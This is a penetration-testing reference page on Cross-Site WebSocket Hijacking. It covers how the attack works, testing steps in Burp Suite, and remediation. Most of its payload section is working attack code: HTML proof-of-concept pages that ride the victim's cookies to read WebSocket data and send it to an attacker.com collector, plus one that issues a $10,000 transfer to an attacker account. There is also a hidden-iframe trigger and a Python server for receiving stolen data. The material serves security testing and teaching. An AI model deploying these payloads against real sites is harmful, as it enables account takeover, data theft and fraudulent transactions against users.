# Cross-Site WebSocket Hijacking (CSWSH)

## Overview
Cross-Site WebSocket Hijacking (CSWSH) is the WebSocket equivalent of CSRF. It occurs when a WebSocket server fails to validate the `Origin` header of upgrade requests, allowing a malicious web page hosted on an attacker-controlled domain to establish a WebSocket connection to the target server using the victim's credentials (cookies). Unlike standard CSRF, CSWSH enables two-way communication — the attacker can both send commands as the victim and receive the server's responses in real time, enabling data exfiltration in addition to state-changing actions.

## How It Works
1. The victim is authenticated to `wss://target.com/ws` with a session cookie.
2. The victim visits `https://attacker.com/exploit.html` (via phishing, malvertising, etc.).
3. The attacker's page opens a WebSocket to `wss://target.com/ws` — the browser automatically includes the victim's cookies in the upgrade request.
4. The server, lacking origin validation, accepts the connection.
5. The attacker's JavaScript reads the victim's real-time data and sends commands on their behalf.

This differs from CSRF in that a CSRF attack blindly fires a request and cannot read the response (due to the Same-Origin Policy for HTTP). WebSocket connections, however, are not subject to the Same-Origin Policy for message data — a cross-origin page that successfully establishes a WebSocket connection can freely read and write messages.

## Impact
- Full account takeover via access to authentication tokens or sensitive actions
- Real-time data exfiltration of all messages, feeds, and responses
- Performing privileged actions on behalf of the victim (fund transfers, data deletion)
- Pivoting to internal systems if the WebSocket has access to internal APIs
- Persistent backdoor if the WebSocket connection is long-lived and not terminated on logout

## Where to Look
- WebSocket endpoints that handle authenticated operations
- Absence of `Origin` validation in the WebSocket upgrade handler
- Absence of CSRF tokens in the WebSocket handshake or initial message
- Chat applications, trading platforms, admin consoles, collaborative tools

## Testing Steps
1. Identify WebSocket endpoints by browsing with Burp intercepting.
2. In Burp, find the WebSocket upgrade request in **WebSocket History**.
3. Send the upgrade request to **Repeater** and change the `Origin` header to `https://attacker.com`.
4. If the server responds with `101 Switching Protocols` — it is vulnerable to CSWSH.
5. Build the PoC HTML page below.
6. Host the PoC (Python simple HTTP server, ngrok, or Burp Collaborator page).
7. Open the PoC in a browser where you are authenticated to the target — observe data exfiltration.
8. Confirm cookies are being sent with the WebSocket upgrade via Burp — look for `Cookie:` in the handshake.
9. Test whether an anti-CSRF token is required in the first WebSocket message.
10. Document the full data access and action capabilities available through the hijacked connection.

## Payloads / Techniques

**Full CSWSH Proof-of-Concept (PoC) HTML:**
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSWSH PoC</title>
</head>
<body>
<h2>Loading...</h2>
<div id="output"></div>
<script>
  var output = document.getElementById('output');
  var attacker_server = 'https://attacker.com/collect';

  function log(msg) {
    console.log(msg);
    var p = document.createElement('p');
    p.textContent = msg;
    output.appendChild(p);
  }

  // Connect to target using victim's cookies (sent automatically)
  var ws = new WebSocket('wss://target.com/ws');

  ws.onopen = function() {
    log('[+] Connected to target WebSocket (victim credentials used)');

    // Send common discovery messages
    var messages = [
      JSON.stringify({type: 'getProfile'}),
      JSON.stringify({action: 'listMessages'}),
      JSON.stringify({cmd: 'whoami'}),
      JSON.stringify({type: 'getToken'}),
    ];

    messages.forEach(function(msg, i) {
      setTimeout(function() {
        ws.send(msg);
        log('[>] Sent: ' + msg);
      }, i * 500);
    });
  };

  ws.onmessage = function(event) {
    var data = event.data;
    log('[<] Received: ' + data);

    // Exfiltrate received data to attacker server
    fetch(attacker_server, {
      method: 'POST',
      mode: 'no-cors',  // avoid CORS preflight for simple requests
      body: data,
      headers: { 'Content-Type': 'text/plain' }
    });
  };

  ws.onerror = function(e) {
    log('[!] WebSocket error: ' + JSON.stringify(e));
  };

  ws.onclose = function(e) {
    log('[*] Connection closed: code=' + e.code + ' reason=' + e.reason);
  };
</script>
</body>
</html>
```

**PoC with command execution (e.g., banking transfer):**
```html
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  // Perform action as victim
  ws.send(JSON.stringify({
    action: 'transfer',
    to: 'attacker_account',
    amount: 10000,
    currency: 'USD'
  }));
};
ws.onmessage = function(e) {
  // Exfil confirmation
  new Image().src = 'https://attacker.com/log?r=' + encodeURIComponent(e.data);
};
</script>
```

**PoC with iframe trigger (for clickjacking combination):**
```html
<iframe src="exploit.html" style="display:none"></iframe>
<p>Click anywhere to continue...</p>
<script>
document.addEventListener('click', function() {
  document.querySelector('iframe').contentWindow.location = 'exploit.html';
});
</script>
```

**Collecting exfiltrated data on attacker server (Python):**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        print(f"[CSWSH DATA] {self.client_address[0]}: {body.decode()}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```

**Checking CSRF token requirement in first message:**
```javascript
// Some apps require a token in the first WS message
ws.onopen = function() {
  // Try with no token — if data returned, no CSRF protection
  ws.send(JSON.stringify({type: 'connect'}));
  
  // If rejected, try to extract token from the page first
  // (but attacker.com cannot read target.com's DOM due to SOP)
};
```

## Burp Suite Tips
- Go to **Proxy > WebSockets history** and find any WebSocket handshake.
- Send to **Repeater** and change `Origin: https://attacker.com` — if you get `101`, confirm the vulnerability.
- Use **Burp's browser** with the PoC HTML loaded as a local file or via an HTTP server to run the full attack.
- The **CSWSH** active scan check in Burp Pro will automatically flag vulnerable endpoints.
- Use **Burp Collaborator** as the `attacker_server` in the PoC to receive exfiltrated data in a reliable way.
- Monitor the **WebSocket history** while running the PoC to see all frames transmitted in the hijacked connection.

## Tools
- Burp Suite Pro — automated CSWSH scanning and WebSocket interception
- wscat — CLI WebSocket client for manual testing: `wscat -c wss://target.com/ws -H "Origin: https://attacker.com"`
- websocat — `websocat -H 'Origin: https://attacker.com' wss://target.com/ws`
- Python websocket-client — scripted CSWSH simulation
- OWASP ZAP WebSocket security tests

## Remediation
- Validate the `Origin` header against a strict allowlist on every WebSocket upgrade request:
  ```python
  ALLOWED_ORIGINS = {'https://app.example.com', 'https://www.example.com'}
  
  def on_open(websocket, request):
      origin = request.headers.get('Origin', '')
      if origin not in ALLOWED_ORIGINS:
          websocket.close(4001, 'Forbidden origin')
          return
  ```
- Require a CSRF token in the WebSocket handshake URL or in the first message after connection.
- Use WebSocket sub-protocols with token-based auth (`Sec-WebSocket-Protocol: token.xxxxx`) as an additional auth layer.
- Implement `SameSite=Strict` or `SameSite=Lax` on session cookies to prevent them from being sent in cross-origin WebSocket requests in modern browsers.
- Log and alert on WebSocket connections from unexpected origins.

## References
https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
https://christian-schneider.net/CrossSiteWebSocketHijacking.html
https://owasp.org/www-community/attacks/Cross-Site_WebSocket_Hijacking
https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#websockets
